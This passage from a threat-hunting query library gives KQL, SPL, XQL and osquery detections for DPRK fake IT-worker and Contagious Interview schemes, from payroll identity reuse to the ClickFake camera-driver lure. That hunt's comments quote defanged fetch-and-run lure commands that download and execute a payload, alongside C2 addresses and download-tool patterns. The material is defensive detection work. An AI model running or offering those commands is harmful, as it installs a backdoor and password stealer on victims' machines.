    or CommandLine=/ push /i
| CommandLine=/(github\.com|gitlab\.com|bitbucket\.org|gitee\.com)/i
| not CommandLine=/(github\.com|gitlab\.com|bitbucket\.org)[:\/]your-org\//i
| table([@timestamp, ComputerName, UserName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
queries.note: git commands that change a remote, mirror-clone or push to a public hosting service outside the organisation's own paths.

tuning.reason: it matches every push to a public hosting service, including ordinary open-source contributions, where remote add, remote set-url and clone --mirror are the stronger signs of a copy
tuning.remove: Delete the line beginning // optional: and the or line after it.

queries.query:
// Replace your-org with the organisation's own paths on the hosting services.
dataset = xdr_data
| filter event_type = ENUM.PROCESS and lowercase(action_process_image_name) in ("git.exe", "git")
| filter action_process_image_command_line ~= "(?i)(remote add|remote set-url|clone --mirror)"
    // optional: every push to a public service, including legitimate open-source work
    or action_process_image_command_line ~= "(?i) push "
| filter action_process_image_command_line ~= "(?i)(github\.com|gitlab\.com|bitbucket\.org|gitee\.com)"
| filter not (action_process_image_command_line ~= "(?i)(github\.com|gitlab\.com|bitbucket\.org)[:/]your-org/")
| fields _time, agent_hostname, actor_effective_username, action_process_image_command_line, actor_process_image_name
| sort desc _time
queries.note: git commands that change a remote, mirror-clone or push to a public hosting service outside the organisation's own paths.

tuning.reason: it matches every push to a public hosting service, including ordinary open-source contributions, where remote add, remote set-url and clone --mirror are the stronger signs of a copy
tuning.remove: Delete the line beginning // optional: and the or line after it.

false_positive_notes: Engineers contribute to open-source projects from work machines and mirror repositories for legitimate migrations, so a hit is not an alert on its own.
Replace the your-org placeholder with the organisation's own paths first, and exclude service accounts and CI runners.
The endpoint queries miss git run through an IDE that hides the remote URL and see nothing on a device without an agent, as contractor laptops often are.
Both are strongest as evidence gathered after another hunt has raised the question, and as the record to preserve before a termination conversation.

title: Fabricated Candidate Personas and Portfolio-Site Infrastructure
summary: A recruiting-side hunt: the free site builders that host fabricated candidate portfolios, the identity-reuse patterns across applications, and the profile tells that repeat across personas.
description: This hunt runs before hire, over recruiting-workstation traffic rather than endpoint telemetry on employees. ReliaQuest documents fabricated candidate profiles on free site builders, with AI-generated biographies, up to twelve years of copied experience, near-absent posting history, a near-verbatim skill list, GitHub repositories with no commits by their supposed owner, and profiles kept open-to-work after hire.

Mandiant adds background-check patterns: personas sharing one email address, United States addresses paired with education from institutions outside North America, universities that differ between the check and the resume, resumes overlapping published ones, and testimonials illustrated with other people's images. Its one published hosted persona is a Netlify subdomain.
The queries cover the web-facing half. The identity-reuse patterns, such as one email address across personas, need an applicant-tracking export and are an HR-system check rather than a log query.
logic: Collect: DNS lookups and proxy URLs from recruiting workstations on Windows and macOS, last 90 days
Match: the host is daniel-ayala.netlify.app, or any subdomain of jimdosite.com or netlify.app
Exclude: devices outside the recruiting-workstation group (placeholder list)
Report: devices and users with the candidate sites reached and a count of hits on the published persona
technique_scope: Establish Accounts and develop fabricated personas ahead of access (MITRE ATT&CK T1585, T1585.001, T1587.001) in support of fraudulently obtained employment (T1078).

indicators.note: Free site builder ReliaQuest names as hosting fabricated candidate profiles.
Named by ReliaQuest; Mandiant publishes daniel-ayala.netlify.app as a specific example.
Persona site published in Mandiant's indicator list (2024-09-23).

queries.query:
// Replace the placeholder with the recruiting workstations.
let RecruitingDevices = dynamic(["recruiting-ws-01"]);
DeviceNetworkEvents
| where Timestamp > ago(90d)
| where DeviceName in~ (RecruitingDevices)
| where RemoteUrl has "daniel-ayala.netlify.app"
     // optional: any free portfolio site on the two builders ReliaQuest names, which every such candidate matches
     or RemoteUrl has_any ("jimdosite.com", "netlify.app")
| extend Site = tolower(extract(@"(?i)(?:^|[./@])([a-z0-9-]+\.(?:jimdosite\.com|netlify\.app))(?:[:/?#]|$)", 1, RemoteUrl))
| summarize Requests = count(), Sites = make_set(Site, 20),
            PublishedPersona = countif(Site == "daniel-ayala.netlify.app"), LastSeen = max(Timestamp)
        by DeviceName, InitiatingProcessAccountName
| sort by PublishedPersona desc, LastSeen desc
queries.note: Recruiting workstations that reached the published persona site or another free portfolio site, persona hits first.

tuning.part: the jimdosite.com and netlify.app subdomain match
tuning.reason: these free builders host millions of ordinary sites, so every candidate with a portfolio on one is returned and only the published persona is a known indicator
tuning.remove: Delete the line beginning // optional: and the or RemoteUrl has_any line after it.

queries.query:
```sourcetype placeholders: index=proxy (url, src, user) and index=dns (query, src); recruiting_workstations.csv has a src column```
```optional: the OR isnotnull(site) match covers any free portfolio site on the two builders ReliaQuest names, which every such candidate matches```
(index=proxy OR index=dns) (url=* OR query=*) earliest=-90d
| lookup recruiting_workstations.csv src OUTPUT team
| where isnotnull(team)
| eval target=lower(coalesce(url, query))
| rex field=target "(?:^|[./@])(?<site>[a-z0-9-]+\.(?:jimdosite\.com|netlify\.app))(?:[:/?#]|$)"
| eval published=if(site="daniel-ayala.netlify.app", 1, 0)
| where published=1 OR isnotnull(site)
| stats count AS requests values(site) AS sites sum(published) AS published_persona max(_time) AS last_seen BY src, user
| sort 0 - published_persona, - last_seen
| convert ctime(last_seen)
queries.note: Recruiting workstations and users that reached the published persona site or another free portfolio site, in proxy or DNS data.

tuning.part: the jimdosite.com and netlify.app subdomain match
tuning.reason: these free builders host millions of ordinary sites, so every candidate with a portfolio on one is returned and only the published persona is a known indicator
tuning.remove: Delete OR isnotnull(site) from the second where line and the optional comment above it.

queries.query:
// Replace the placeholder with the recruiting workstations.
dataset = xdr_data
| filter event_type = ENUM.NETWORK and dns_query_name != null and agent_hostname in ("recruiting-ws-01")
| alter site = lowercase(dns_query_name)
| filter site = "daniel-ayala.netlify.app"
    // optional: any free portfolio site on the two builders ReliaQuest names, which every such candidate matches
    or site ~= "\.(jimdosite\.com|netlify\.app)$"
| alter published = if(site = "daniel-ayala.netlify.app", 1, 0)
| comp count() as requests, values(site) as sites, sum(published) as published_persona, max(_time) as last_seen by agent_hostname, actor_effective_username
| sort desc published_persona
queries.note: Recruiting workstations and users that looked up the published persona site or another free portfolio site, persona hits first.

tuning.part: the jimdosite.com and netlify.app subdomain match
tuning.reason: these free builders host millions of ordinary sites, so every candidate with a portfolio on one is returned and only the published persona is a known indicator
tuning.remove: Delete the line beginning // optional: and the or site ~= line after it.

false_positive_notes: Netlify and comparable platforms host an enormous number of ordinary personal sites, so a candidate hosting a portfolio on one is normal; hence the scoping to recruiting data rather than web traffic.

The identity-reuse patterns assume an applicant-tracking export most organisations must build, and have innocent explanations: agencies resubmit candidates, referrals share a phone number, families share an address.
Nothing here should reject an applicant on its own; each signal decides where to verify more carefully.
Handling candidate data this way carries legal and privacy obligations that vary by jurisdiction.

title: Identity Reuse and Payroll-Fraud Indicators
summary: Shared bank details across employees who should have nothing in common, plus rapid post-hire direct-deposit changes, corroborated against sign-in geography.
description: Facilitator-run schemes use stolen or knowingly loaned United States identities to pass background and employment-eligibility checks, then route payroll through facilitator-controlled accounts and reuse a small set of financial and mailing details across what appear to the employer as distinct hired individuals. Christina Chapman's operation alone used sixty-eight stolen American identities to place workers at 309 companies.

This is an HR and IT-operations correlation hunt rather than an endpoint or network one. It looks for shared routing and account numbers across distinct employee records and rapid post-hire direct-deposit changes, corroborated by sign-in telemetry inconsistent with the claimed location. Mandiant's related control, requiring a United States bank account, raises the verification bar.
logic: Collect: HRIS and payroll records per employee, and successful identity-provider sign-ins from the last 30 days
Match: two or more employee records share one bank routing and account number
Match: or two or more employee records share a mailing address
Match: or the direct-deposit account was changed within 45 days of the hire date
Report: each flagged employee with the signals hit and sign-in countries other than the claimed country, shared bank details first
technique_scope: Fraudulently obtained employment and valid-account misuse (MITRE ATT&CK T1078) combined with financial-identity reuse; not a file or network indicator hunt.

queries.note: Employees returned either share bank details with a colleague or changed deposit details within 45 days of hire, and OtherCountries shows where else they signed in, so verify the identity manually.
queries.query:
// HRPayroll is a placeholder for the HRIS table you ingest: EmployeeId, UserPrincipalName, HireDate, ClaimedLocationCountry, BankRouting, BankAccount, MailingAddress, DirectDepositChangedOn.
let Payroll = HRPayroll
    | extend BankKey = strcat(BankRouting, ":", BankAccount), AddressKey = tolower(trim(@"\s+", MailingAddress));
let Countries = SigninLogs
    | where TimeGenerated > ago(30d) and ResultType == "0"
    | summarize SignInCountries = make_set(tostring(LocationDetails.countryOrRegion)) by UserPrincipalName;
Payroll
| lookup kind=leftouter (Payroll | summarize BankEmployees = dcount(EmployeeId) by BankKey) on BankKey
// optional: shared mailing address, the line below and the matching line in the where clause
| lookup kind=leftouter (Payroll | summarize AddressEmployees = dcount(EmployeeId) by AddressKey) on AddressKey
| extend EarlyDepositChange = DirectDepositChangedOn between (HireDate .. (HireDate + 45d))
| where BankEmployees > 1 or EarlyDepositChange
// optional: shared mailing address, the line below
    or AddressEmployees > 1
| lookup kind=leftouter Countries on UserPrincipalName
| extend OtherCountries = set_difference(SignInCountries, pack_array(ClaimedLocationCountry))
| project-away BankRouting, BankAccount, MailingAddress, BankKey, AddressKey, SignInCountries
| order by BankEmployees desc, HireDate desc

tuning.reason: family members, flatmates and apartment blocks legitimately share an address, so it raises more noise than bank details do
tuning.remove: delete each // optional: comment line together with the single line beneath it (the AddressEmployees lookup and the or AddressEmployees > 1 line)

tuning.reason: a new hire who moves or opens a local account changes deposit details early without any fraud
tuning.remove: delete the EarlyDepositChange extend line and change the where clause to start with where BankEmployees > 1

queries.note: The same signals from the payroll lookup, with sign-in countries taken from the Authentication data model and compared to the claimed country.
queries.query:
```Placeholders: payroll_records.csv is the HRIS export (employee_id, user, hire_time, claimed_country, bank_routing_number, bank_account_number, mailing_address, direct_deposit_changed_time, all epoch times). Sign-ins come from the Authentication data model.```
| inputlookup payroll_records.csv
| eventstats dc(employee_id) AS bank_employees BY bank_routing_number, bank_account_number
```optional: shared mailing address, the line below and the matching line in the where clause```
| eventstats dc(employee_id) AS address_employees BY mailing_address
| eval early_deposit_change=if(isnotnull(direct_deposit_changed_time) AND direct_deposit_changed_time>=hire_time AND direct_deposit_changed_time<=hire_time+45*86400, 1, 0)
| where bank_employees>1 OR early_deposit_change=1
```optional: shared mailing address, the line below```
    OR address_employees>1
| join type=left user
    [| tstats count FROM datamodel=Authentication.Authentication WHERE Authentication.action=success earliest=-30d BY Authentication.user, Authentication.src
     | rename Authentication.user AS user, Authentication.src AS src_ip
     | iplocation src_ip
     | stats values(Country) AS signin_countries BY user]
| eval other_countries=mvmap(signin_countries, if(signin_countries!=claimed_country, signin_countries, null()))
| fields - bank_routing_number, bank_account_number, mailing_address, signin_countries
| sort - bank_employees, - hire_time

tuning.reason: family members, flatmates and apartment blocks legitimately share an address, so it raises more noise than bank details do
tuning.remove: delete each optional comment line together with the single line beneath it (the address_employees eventstats and the OR address_employees>1 line)

tuning.reason: a new hire who moves or opens a local account changes deposit details early without any fraud
tuning.remove: delete the early_deposit_change eval line and change the where clause to start with where bank_employees>1

false_positive_notes: Shared bank details occur legitimately between family members and on joint accounts, and an early direct-deposit change is often a local account opened after moving. Every match needs manual identity verification.

The queries assume a custom HR table or lookup with the columns named in their first comment; adapt them to the HRIS export actually ingested. Handling payroll data this way carries jurisdiction-specific privacy obligations; settle them with counsel first.

title: Account-Verification and Browser OTP Services on Corporate Assets
summary: The services an operation uses to phone-verify accounts in bulk, hold VoIP numbers for personas, and generate multi-factor codes in a browser so a whole team can share one second factor.
description: The operation manual in Hayden McKenzie's second report names the services behind its accounts: sms-man.com and sms-activate.org for bulk phone verification, mailforspam.com as a throwaway Gmail secondary address, slynumber.com and hushed.com for persona numbers, and ssn-check.org for validating Social Security numbers. His fourth report shows SlyNumber used by a working cell.

The manual also names 2fa.live for browser TOTP generation, so multi-factor secrets are shared across a team rather than bound to a device. It is the service most likely to reach an employer's network after hire, because the employer's own prompt is what the code answers. The others belong mostly to the pre-hire stage.
logic: Collect: DNS lookups and web connections from Windows and macOS endpoints, plus DNS server or proxy logs
Match: name is 2fa.live, or a subdomain of it, the browser one-time-code generator
Match: or name is, or is a subdomain of, one of six pre-hire services (SMS verification, disposable mail and numbers, SSN check)
Report: sources with lookup counts and the distinct services reached, most services first
technique_scope: Establish Accounts (MITRE ATT&CK T1585) and Multi-Factor Authentication interception or sharing (T1111) in support of fraudulently obtained employment (T1078).

indicators.note: Browser-based TOTP generation, so a multi-factor secret can be shared across a team (HM2).
SMS verification service for phone-verifying accounts at scale (HM2).
SMS verification service for phone-verifying accounts at scale (HM2).
Temporary email, used as the secondary verification address on new Gmail accounts (HM2).
VoIP numbers used to satisfy phone verification on persona mailboxes and profiles (HM2, HM4).
VoIP numbers named beside SlyNumber as the replacement for Skype and Google Voice (HM2).
Public Social Security number validation service used on stolen or borrowed identities (HM2).

queries.note: A source that reaches 2fa.live, or several of the listed services, is worth checking against the issued-machine inventory; macOS hosts rely on the DnsEvents branch where Defender omits the URL.
queries.query:
// Parent = the last two labels of the host, so any subdomain of a listed domain matches.
union
  (DeviceNetworkEvents
    | where Timestamp > ago(90d) and isnotempty(RemoteUrl)
    | project Timestamp, Source = DeviceName, Name = RemoteUrl),
  (DnsEvents
    | where TimeGenerated > ago(90d)
    | project Timestamp = TimeGenerated, Source = ClientIP, Name)
| extend Parent = extract(@"^(?:[a-z][a-z0-9+.-]*://)?(?:[^/:?#]*\.)?([^./:?#]+\.[^./:?#]+)\.?(?:[:/?#]|$)", 1, tolower(Name))
| where Parent in~ (
    // optional: the six pre-hire services are lower fidelity; delete this line and the next
    "sms-man.com", "sms-activate.org", "mailforspam.com", "slynumber.com", "hushed.com", "ssn-check.org",
    "2fa.live")
| summarize Lookups = count(), FirstSeen = min(Timestamp), LastSeen = max(Timestamp), Domains = make_set(Parent) by Source
| order by array_length(Domains) desc, Lookups desc

tuning.part: the six pre-hire services (sms-man.com, sms-activate.org, mailforspam.com, slynumber.com, hushed.com, ssn-check.org)
tuning.reason: disposable numbers and addresses have ordinary privacy uses and most of this activity precedes hire on the operation's own machines
tuning.remove: delete the // optional: comment line and the line of six domains beneath it, leaving only "2fa.live"

queries.note: The same match over DNS logs, grouped by client so a source reaching several services sorts first.
queries.query:
```Placeholder: index=dns carries the CIM DNS field query; for proxy data use the host field your proxy extracts.```
index=dns earliest=-90d
| eval query=lower(query)
| rex field=query "(?<parent>[^.]+\.[^.]+)\.?$"
| where parent IN (
    ```optional: the six pre-hire services are lower fidelity; delete this line and the next```
    "sms-man.com", "sms-activate.org", "mailforspam.com", "slynumber.com", "hushed.com", "ssn-check.org",
    "2fa.live")
| stats count AS lookups min(_time) AS first_seen max(_time) AS last_seen dc(parent) AS services values(parent) AS domains BY src
| convert ctime(first_seen) ctime(last_seen)
| sort - services, - lookups

title: Persona-Management Tooling on an Employee Endpoint
summary: The tools an operation uses to keep many personas apart and to pass identity checks without a real phone or camera, anti-detect browsers, Android emulators and cookie-import tools among them, found on a machine that belongs to one supposed employee.
description: An operation running dozens of personas must keep them apart. Hayden McKenzie's fourth report describes accounts living inside ixBrowser, an anti-detect browser that isolates each persona in its own profile behind its own metered proxy. His second report adds the Cookie-Editor Chrome extension, listed for importing LinkedIn session cookies so a session moves between operators without signing in again.

The same manual answers identity verification without a physical phone or camera: the QR code is captured with ShareX and redirected into LDPlayer, an Android emulator. None of these tools is malicious. This hunt looks for the combination on one employee's issued machine, whose job needs neither.
logic: Collect: process starts on Windows and macOS endpoints, plus Chromium extension inventory where the product exposes it
Match: executable path contains ixBrowser (anti-detect browser) or LDPlayer (Android emulator)
Match: or the executable is ShareX, or a Chromium extension is named Cookie-Editor (common tools, weak alone)
Report: devices with the distinct tools found, devices holding two or more tools first
technique_scope: Persona management and account portability (MITRE ATT&CK T1585, T1550.004 for session-cookie reuse) in support of fraudulently obtained employment (T1078).

indicators.note: Anti-detect browser holding one isolated profile per persona, each behind its own metered proxy (HM4).
Android emulator used to redirect identity-verification challenges away from a real camera (HM2).
Screen capture (ShareX.exe) used to lift verification QR codes into the emulator (HM2). Common and legitimate on its own.

Chrome extension listed in the operation manual for importing LinkedIn session cookies (HM2). Match on the extension name; several extensions share it, so confirm the identifier against the store listing before blocking.

queries.note: A device holding two or more tools, or any ixBrowser or LDPlayer hit, matches the persona workflow the reports describe and belongs to someone whose job needs neither.
queries.query:
union
    // optional: Cookie-Editor is common among web developers; delete this line and the next
    (DeviceTvmBrowserExtensions | where ExtensionName contains "Cookie-Editor" or ExtensionName contains "Cookie Editor" | project Timestamp = now(), DeviceId, Tool = "Cookie-Editor"),
    (DeviceProcessEvents
        | where Timestamp > ago(90d)
        | where FolderPath contains "ixBrowser" or FolderPath contains "LDPlayer"
            // optional: ShareX is common and means nothing alone; delete this line and the next
            or FileName =~ "ShareX.exe"
        | extend Tool = case(FolderPath contains "ixBrowser", "ixBrowser", FolderPath contains "LDPlayer", "LDPlayer", "ShareX")
        | project Timestamp, DeviceId, DeviceName, Tool)
| summarize DeviceName = take_anyif(DeviceName, isnotempty(DeviceName)), Tools = make_set(Tool), ToolCount = dcount(Tool), LastSeen = max(Timestamp) by DeviceId
| order by ToolCount desc, LastSeen desc

tuning.reason: ShareX is a common legitimate screen-capture tool and means nothing alone
tuning.remove: delete the // optional: comment line and the line beneath it

tuning.reason: several extensions share the name and it is common among web developers
tuning.remove: delete the // optional: comment line and the line beneath it

```Placeholder: the Endpoint data model is populated from Windows and macOS process events.```
| tstats count min(_time) AS first_seen max(_time) AS last_seen FROM datamodel=Endpoint.Processes
    WHERE Processes.process_path="*ixBrowser*" OR Processes.process_path="*LDPlayer*"
    ```optional: ShareX is common and means nothing alone; delete this line and the next```
    OR Processes.process_name="ShareX.exe"
    BY Processes.dest, Processes.process_path
| eval tool=case(like(lower('Processes.process_path'), "%ixbrowser%"), "ixBrowser", like(lower('Processes.process_path'), "%ldplayer%"), "LDPlayer", true(), "ShareX")
| stats sum(count) AS executions dc(tool) AS tool_count values(tool) AS tools max(last_seen) AS last_seen BY Processes.dest
| convert ctime(last_seen)
| sort - tool_count, - executions

tuning.reason: ShareX is a common legitimate screen-capture tool and means nothing alone

title: Contagious Interview Fake-Recruiter and Front-Company Infrastructure
summary: Catches the interview lure itself: a candidate's workstation cloning and running an unvetted take-home repository, and traffic toward the front companies DPRK operators register to look like employers.
description: Operators tracked under the Contagious Interview and DeceptiveDevelopment clusters pose as recruiters on LinkedIn and job boards, sometimes standing up United States registered front companies before pushing a candidate to a coding-assessment repository that delivers BeaverTail and InvisibleFerret. Silent Push documented BlockNovas LLC, Angeloper Agency and SoftGlide LLC; the FBI seized the BlockNovas and SoftGlide domains in April 2025.

This hunt targets the moment a candidate's workstation clones and executes an unvetted take-home assignment repository, and traffic toward reported front-company infrastructure, so the lure can be caught before or during initial access rather than only after malware runs.
logic: Collect: DNS lookups and web connections on Windows and macOS endpoints, plus process starts for the sequence
Match: name is, or is a subdomain of, a reported front-company domain (BlockNovas, Angeloper, SoftGlide)
Match: or git clone then node, npm, python or pip within 10 minutes (lower fidelity; KQL, SPL and Sigma only)
Report: devices with the signals hit, newest first
technique_scope: Initial access through social-engineering job-interview lures (MITRE ATT&CK T1566, T1204.002) fronted by DPRK-controlled shell companies and recruiter personas (Group G1052, Contagious Interview).

indicators.note: BlockNovas front-company domain, with subdomains such as gitlab and apply, documented by Silent Push; seized by the FBI in April 2025.
Second BlockNovas application domain documented by Silent Push.
Angeloper Agency front-company domain documented by Silent Push.
Angeloper Agency domain documented by Silent Push.
SoftGlide front-company domain documented by Silent Push; seized by the FBI in April 2025.

queries.note: A device with a front-company domain hit is the strongest result; a clone-then-run hit alone needs recruiting context before escalating.
queries.query:
union
    // optional: lower fidelity, git clone then a developer tool that names the cloned folder; delete this line and the branch below it
    (DeviceProcessEvents
        | where Timestamp > ago(1d) and FileName in~ ("node.exe", "node", "npm.cmd", "npm", "python.exe", "python", "python3", "pip.exe", "pip", "pip3")
        | join kind=inner (
            DeviceProcessEvents
            | where Timestamp > ago(1d) and FileName in~ ("git.exe", "git") and ProcessCommandLine has "clone"
            | extend RepoFolder = extract(@"([^/\\\s]+?)(?:\.git)?[\s""']*$", 1, ProcessCommandLine)
            | where isnotempty(RepoFolder)
            | project DeviceId, CloneTime = Timestamp, CloneCommand = ProcessCommandLine, RepoFolder
          ) on DeviceId
        | where Timestamp between (CloneTime .. (CloneTime + 10m))
        | where ProcessCommandLine has RepoFolder or InitiatingProcessCommandLine has RepoFolder or FolderPath has RepoFolder
        | project Timestamp, DeviceId, DeviceName, Signal = "clone then run", Detail = strcat(CloneCommand, " -> ", ProcessCommandLine)),
    (DeviceNetworkEvents
        | where Timestamp > ago(30d)
        | where RemoteUrl has_any ("blocknovas.com", "apply-blocknovas.site", "angeloper.com", "angeloperonline.online", "softglide.co")
        | project Timestamp, DeviceId, DeviceName, Signal = "front-company domain", Detail = RemoteUrl)
| summarize Hits = count(), Signals = make_set(Signal), FirstSeen = min(Timestamp), LastSeen = max(Timestamp), Details = make_set(Detail, 5) by DeviceId, DeviceName
| order by array_length(Signals) desc, LastSeen desc

queries.query:

| tstats count max(_time) AS _time FROM datamodel=Network_Resolution.DNS WHERE earliest=-30d DNS.query IN ("blocknovas.com","*.blocknovas.com","apply-blocknovas.site","*.apply-blocknovas.site","angeloper.com","*.angeloper.com","angeloperonline.online","*.angeloperonline.online","softglide.co","*.softglide.co") BY DNS.src, DNS.query

```optional: lower fidelity, git clone then a developer tool that names the cloned folder; delete this line and the append block below it```
| append
    [| tstats count FROM datamodel=Endpoint.Processes WHERE earliest=-1d ((Processes.process_name IN ("git","git.exe") AND Processes.process="*clone*") OR Processes.process_name IN ("node","node.exe","npm","npm.cmd","python","python3","python.exe","pip","pip3","pip.exe")) BY _time span=1s, Processes.dest, Processes.process_name, Processes.process
     | rename Processes.* AS *
     | sort 0 dest _time
     | eval is_clone=if(match(process_name, "^git"), 1, 0)
     | eval clone_time=if(is_clone=1, _time, null()), clone_cmd=if(is_clone=1, process, null())
     | streamstats current=f last(clone_time) AS prev_clone_time last(clone_cmd) AS prev_clone_cmd BY dest
     | where is_clone=0 AND _time-prev_clone_time<=600
     | rex field=prev_clone_cmd "(?<repo>[^/\s]+?)(?:\.git)?\s*$"
     | where like(process, "%".repo."%")
     | eval host=dest, detail=prev_clone_cmd." -> ".process, signal="clone then run"
     | fields _time, host, detail, signal]
| stats count AS hits min(_time) AS first_seen max(_time) AS last_seen values(signal) AS signals values(detail) AS details BY host
| convert ctime(first_seen) ctime(last_seen)
| sort - last_seen

title: ClickFake Interview: ClickFix Execution and GolangGhost Persistence Site
summary: The lure where a fake interview site claims the candidate's camera driver is broken and has them paste a command into Run or Terminal, delivering GolangGhost or FrostyFerret.
description: Sekoia documents Contagious Interview adopting the ClickFix pattern. A candidate reaches a video-assessment site, is told their camera needs a driver fix, and is walked through pasting a command into the Windows Run dialog or a macOS terminal. Windows fetches and runs an archive presented as NVIDIA drivers; macOS downloads a script to /var/tmp and runs it detached.

The payload is GolangGhost on both platforms, with FrostyFerret stealing passwords on macOS. Sekoia published a Sigma correlation rule and YARA rules. This hunt covers the Windows process chain, the Run dialog artifact in the registry, the macOS script and LaunchAgent, and the fake-assessment domains.
logic: Collect: process, registry, file and network events on Windows and macOS endpoints
Match: command line names smartdriverfix.cloud, /var/tmp/coremedia.sh, /var/tmp/VCam or an nvidiadrivers folder
Match: or NvidiaDriverUpdate Run value, com.drive.plist LaunchAgent, or staged coremedia.sh, VCam.zip, nvidia.py or update.vbs is written
Match: or connection to a C2 address (38.134.148.218, 154.62.226.22, 72.5.42.93) on port 8080, or to smartdriverfix.cloud
Match: or, lower fidelity: a fake-assessment domain, explorer.exe starting a download command, or a RunMRU download entry
Report: devices with the signal kinds hit, most kinds first
technique_scope: User execution of a pasted command (MITRE ATT&CK T1204.004, T1059.001, T1059.004) following a social-engineering interview lure (T1566), staging a Go backdoor (T1105).

queries.note: A device with two or more signals, or any process or persistence signal, took the ClickFake lure; domain and Run-dialog signals alone need context.
queries.query:
// Lure command (Sekoia, defanged), Windows: curl -k -o "%TEMP%\nvidiadrivers.zip" https://api.smartdriverfix[.]cloud/nvidiadrivers-kp9s.update && powershell -Command "Expand-Archive -Force -Path '%TEMP%\nvidiadrivers.zip' -DestinationPath '%TEMP%\nvidiadrivers'" && wscript "%TEMP%\nvidiadrivers\update.vbs"
// Lure command (Sekoia, defanged), macOS: curl -k -o /var/tmp/coremedia.sh https://api.smartdriverfix[.]cloud/coremedia-kp9s.sh && chmod +x /var/tmp/coremedia.sh && nohup bash /var/tmp/coremedia.sh >/dev/null 2>&1 &
union
    (DeviceProcessEvents
        | where Timestamp > ago(30d)
        | where ProcessCommandLine matches regex @"(?i)(smartdriverfix\.cloud|/var/tmp/(coremedia\.sh|VCam)|[^a-z]nvidia-?drivers)"
            // optional: lower fidelity, administrators also paste download commands into the Run dialog; delete this line and the next
            or (InitiatingProcessFileName =~ "explorer.exe" and FileName in~ ("cmd.exe", "powershell.exe", "pwsh.exe", "curl.exe", "wscript.exe", "mshta.exe") and ProcessCommandLine matches regex @"(?i)(curl|Invoke-WebRequest|iwr|Expand-Archive|certutil|bitsadmin)")
        | project Timestamp, DeviceId, DeviceName, Signal = "process", Detail = ProcessCommandLine),
    (DeviceRegistryEvents
        | where Timestamp > ago(90d)
        | where (RegistryKey contains @"\CurrentVersion\Run" and (RegistryValueName =~ "NvidiaDriverUpdate" or RegistryValueData has_any ("update.vbs", "nvidia.py")))
            // optional: lower fidelity, RunMRU also records administrators' legitimate commands; delete this line and the next
            or (RegistryKey contains @"\Explorer\RunMRU" and RegistryValueData matches regex @"(?i)(powershell|pwsh|curl|mshta|wscript|certutil|bitsadmin|iwr|irm)")
        | project Timestamp, DeviceId, DeviceName, Signal = "registry", Detail = strcat(RegistryKey, " ", RegistryValueName, " ", RegistryValueData)),
    (DeviceFileEvents
        | where Timestamp > ago(30d)
        | where (FileName =~ "com.drive.plist" and FolderPath contains "/Library/LaunchAgents")
            or (FileName in~ ("coremedia.sh", "VCam.zip") and FolderPath contains "/var/tmp")
            or FolderPath contains "/var/tmp/VCam"
            or FolderPath matches regex @"(?i)[\\/]Temp[\\/]nvidia-?drivers"
            or FileName in~ ("nvidia.py", "update.vbs")
        | project Timestamp, DeviceId, DeviceName, Signal = "file", Detail = strcat(FolderPath, "/", FileName)),
    (DeviceNetworkEvents
        | where Timestamp > ago(90d)
        | where (RemoteIP in ("38.134.148.218", "154.62.226.22", "72.5.42.93") and RemotePort == 8080)
            or RemoteUrl has_any ("smartdriverfix.cloud"
                // optional: lower fidelity, the 38 fake-assessment domains date from March 2025 and rotate; delete this line and the lines starting with a comma below it
                , "vid-crypto-assess.com", "assessiohq.com", "blockassess.com", "blockchainjobassessment.com", "blockchainjobhub.com"
                , "candidateinsightinfo.com", "coinbase-walet.biz", "coinbase-walet.me", "competency-core.com", "devchallengehq.com"
                , "evalassesso.com", "evalswift.com", "quickskill-review.com", "jobinterview360.com", "livehirehub.com"
                , "talenthiring360.com", "quickassessio.com", "quickhire360.com", "quickinterview360.com", "eskillprof.com"
                , "evalvidz.com", "intervwolf.com", "vidcruiterinterview.com", "vidcruitermaster.com", "vidintermaster.com"
                , "skillhiretrack.com", "skillprooflab.com", "talentcheck.pro", "talentsnaptest.com", "talentview360.com"
                , "test-wolf.com", "toptalentassess.com", "ugethired360.com", "vidassess360.com", "vidassesspro.com"
                , "videorecruitpro.com", "vidhirehub.com", "zenspiretech.com")
        | project Timestamp, DeviceId, DeviceName, Signal = "network", Detail = strcat(RemoteIP, ":", RemotePort, " ", RemoteUrl))
| summarize Hits = count(), Signals = make_set(Signal), FirstSeen = min(Timestamp), LastSeen = max(Timestamp), Details = make_set(Detail, 5) by DeviceId, DeviceName
| order by array_length(Signals) desc, LastSeen desc

queries.note: A point-in-time check of running processes, startup items, staged files and open sockets for the same artifacts.
queries.query:
SELECT 'process' AS signal, name AS item, cmdline AS detail
FROM processes
WHERE lower(cmdline) LIKE '%smartdriverfix.cloud%' OR lower(cmdline) LIKE '%/var/tmp/coremedia.sh%' OR lower(cmdline) LIKE '%/var/tmp/vcam%'
   OR lower(cmdline) LIKE '%\nvidiadrivers%' OR lower(cmdline) LIKE '%\nvidia-drivers%'
UNION ALL
SELECT 'persistence', name, path || ' ' || args
FROM startup_items
WHERE lower(name) = 'nvidiadriverupdate' OR lower(path) LIKE '%/com.drive.plist' OR lower(args) LIKE '%update.vbs%' OR lower(args) LIKE '%nvidia.py%'
UNION ALL
SELECT 'file', filename, path
FROM file
WHERE (path LIKE '/var/tmp/%' AND filename IN ('coremedia.sh', 'VCam.zip', 'VCam'))
   OR path LIKE '/Library/LaunchAgents/com.drive.plist'
   OR path LIKE 'C:\Users\%\AppData\Local\Temp\nvidiadrivers\%'
   OR path LIKE 'C:\Users\%\AppData\Local\Temp\nvidia-drivers\%'
UNION ALL
SELECT 'network', CAST(pid AS TEXT), remote_address || ':' || remote_port
FROM process_open_sockets
WHERE remote_port = 8080 AND remote_address IN ('38.134.148.218', '154.62.226.22', '72.5.42.93');

false_positive_notes: Administrators paste legitimate one-liners into the Run dialog, and Expand-Archive is an ordinary cmdlet, so the Windows process-chain queries need RunMRU evidence or a suspicious destination beside them.
The domain list dates from March 2025 and the infrastructure rotates; expect an empty result and do not read it as an all-clear.
The RunMRU query depends on the delivery technique rather than any particular command, but it is per-user and an operator who later cleared it leaves nothing.
On macOS, developers legitimately run scripts from /var/tmp with nohup, so require the coremedia.sh name, the plist or the address before escalating.

title: macOS Persistence and Staging Paths Used by Contagious Interview Payloads
summary: The launch agents, /var/tmp staging files, fake installer packages and abused developer signature that Contagious Interview's macOS payloads leave on a developer's Mac, from the FlexibleFerret, GolangGhost and BeaverTail installer lures.
